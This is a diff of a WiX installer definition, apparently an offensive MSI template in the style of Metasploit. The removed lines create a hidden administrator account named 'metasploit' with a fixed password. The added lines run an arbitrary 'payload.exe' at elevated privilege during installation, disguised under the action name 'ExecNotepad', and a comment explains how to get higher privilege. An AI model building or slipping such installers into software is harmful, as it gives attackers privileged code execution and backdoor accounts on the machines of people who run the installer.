@@ -4,10 +4,7 @@
     Language='1033' Codepage='1252' Version='1.0.0' Manufacturer='Acme Ltd.'>
 
 	<Package InstallerVersion="100" Languages="0" Manufacturer="Acme Ltd." ReadOnly="no" />	
-	  
-	<!-- Execute must be deferred to run as a higher privilege level -->
-	<CustomAction Id='ExecNotepad' Directory='TARGETDIR' Impersonate='no' Execute='deferred' ExeCommand='cmd.exe /C &quot;net user metasploit P@55w0rd12345 /add /EXPIRES:NEVER &amp; net localgroup Administrators metasploit /add&quot;' Return='ignore'/>
-
+	
 	<Media Id='1' Cabinet='product.cab' EmbedCab='yes' />
 
 	<Directory Id='TARGETDIR' Name='SourceDir'>
@@ -15,15 +12,18 @@
 		  <Condition>0</Condition>
 	   </Component>		
 	</Directory>
+	
+	<!-- Execute must be deferred and Impersonate no to run as a higher privilege level -->
+	<CustomAction Id='ExecNotepad' Directory='TARGETDIR' Impersonate='no' Execute='deferred' ExeCommand='[SourceDir]payload.exe' Return='asyncNoWait'/>
 
     <Feature Id='Complete' Level='1'>
 		<ComponentRef Id='MyComponent' />
     </Feature>
 	
 	<InstallExecuteSequence>
+		<ResolveSource After="CostInitialize" />
 		<Custom Action="ExecNotepad" After="InstallInitialize" />
 	</InstallExecuteSequence>
-
 
   </Product>
 </Wix>
